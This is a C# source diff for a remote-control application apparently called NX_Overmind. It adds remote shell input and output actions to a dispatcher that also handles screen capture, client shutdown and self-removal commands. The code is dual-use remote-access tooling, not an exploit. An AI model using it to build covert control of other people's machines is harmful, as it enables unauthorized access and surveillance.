@@ -4,6 +4,7 @@ using System.IO;
 using System.Text;
 using System.Runtime.Serialization.Formatters.Binary;
 using NX.Collections;
+using NX.Log.NeuroLog;
 
 namespace NX_Overmind.Actions
 {
@@ -38,8 +39,11 @@ namespace NX_Overmind.Actions
         /// <param name="message">Message associated with event</param>
         public delegate void DebugEventHandler(string message);
 
-        public event ActionCenterEventHandler SendData = null;              // Calls the network layer to transmit the data
-        public event ActionCenterEventHandler ReceiveRawCapture = null;     // Invoked when raw bytes are received as data
+        public event ActionCenterEventHandler SendData = null;                      // Calls the network layer to transmit the data
+        public event ActionCenterEventHandler ReceiveRawCapture = null;             // Invoked when raw bytes are received as data
+        public event ActionCenterInternalEventHandler ReceiveAppCommand = null;     // Received commands for the application
+
+        private OvermindLogManager _neuroLog = new OvermindLogManager("NeuroLog", OvermindLogManager.LogEntryType.ActionCenter);
 
         public enum ActionType : byte
         {
@@ -49,7 +53,6 @@ namespace NX_Overmind.Actions
             AppStart,           // Resume
             AppPause,           // Pause
             AppStop,            // Stop/Terminate for this session
-            AppForceStop,       // Force Stop/Terminate for this session
             AppDie,             // Die, remove app from system
             
             CaptureLive,        // For Single (Uncompressed) Log and Screen Capture
@@ -57,6 +60,8 @@ namespace NX_Overmind.Actions
             CaptureQuality,     // Gives info abt server's resolution to optimize quality
             CaptureCursor,      // Bitmap of currently changed cursor
 
+            ShellInput,         // Execute the following command in a shell
+            ShellOutput,        // Receive the output of a shell command
             Shutdown,           // Shutdown Client
             Restart,            // Restart Client
             Monitor,            // Sleep Monitor
@@ -78,6 +83,8 @@ namespace NX_Overmind.Actions
 
         protected CaptureManager _captureManagerModule;     // Capture Manager Module
         protected EventManager _eventManagerModule;         // Event Manager Module
+        protected ShellManager _shellManagerModule;         // Shell Manager Module
+        // TODO: AppManagerModule
         // TODO: FileManagerModule
         // TODO: ShellManagerModule
         // TODO: PranksterModule                            
@@ -97,6 +104,14 @@ namespace NX_Overmind.Actions
                 return this._eventManagerModule;
             }
         }
+
+        public ShellManager ShellManagerModule
+        {
+            get
+            {
+                return this._shellManagerModule;
+            }
+        }
         
         #endregion
 
@@ -109,6 +124,7 @@ namespace NX_Overmind.Actions
             // ACCapture            
             this._captureManagerModule = new CaptureManager(fileSecurityPassword, this.DispatchData);
             this._eventManagerModule = new EventManager(this.DispatchData);
+            this._shellManagerModule = new ShellManager(this.DispatchData);
         }
         
         /// <summary>
@@ -128,7 +144,7 @@ namespace NX_Overmind.Actions
         /// <param name="owner">Sender's Id</param>
         /// <param name="bytes">Data bytes</param>
         public void InitiateAction(int owner, byte[] bytes)
-        {
+        {            
             using (MemoryStream ms = new MemoryStream(bytes))
             {
                 ActionType type = (ActionType)ms.ReadByte();        // Read type of action
@@ -136,22 +152,25 @@ namespace NX_Overmind.Actions
                 byte[] data = new byte[length];
                 ms.Read(data,0, data.Length);
 
+                Log.WriteLine(type.ToString());
+
+                this._neuroLog.WriteFormat("Initiate Action", "Type: {0}\nOwner: {1}\n\nData:\n{1}", type, owner, data);
                 switch (type)
                 {
                     // App Commands
                     case ActionType.AppAutoStart:
-                        break;
+                        //break;
                     case ActionType.AppAutoStop:
-                        break;
+                        //break;
                     case ActionType.AppDie:
-                        break;
-                    case ActionType.AppForceStop:
-                        break;
+                        //break;
                     case ActionType.AppPause:
-                        break;
+                        //break;
                     case ActionType.AppStart:
-                        break;
+                        //break;
                     case ActionType.AppStop:
+                        if(this.ReceiveAppCommand != null)
+                            this.ReceiveAppCommand(owner, type, data);
                         break;
 
                     case ActionType.BytesToFile:
@@ -170,6 +189,14 @@ namespace NX_Overmind.Actions
                     case ActionType.CaptureCursor:
                         this._captureManagerModule.DecodeCaptureCursor(owner, data);
                         break;
+
+                    case ActionType.ShellInput:
+                        this._shellManagerModule.DecodeEvent(owner, bytes, true);
+                        break;
+                    case ActionType.ShellOutput:
+                        this._shellManagerModule.DecodeEvent(owner, bytes, false);
+                        break;
+
                     case ActionType.CDRom:
                         break;
                     case ActionType.Download:
@@ -208,6 +235,7 @@ namespace NX_Overmind.Actions
         {
             if (this.SendData != null)
             {
+                //this._neuroLog.WriteFormat("Dispatch Data", "Destination: {0}\nType: {1}\n\nData:\n{2}", id, type, data);
                 using (MemoryStream ms = new MemoryStream())
                 {
                     ms.WriteByte((byte)type);           // Encapsulate the type
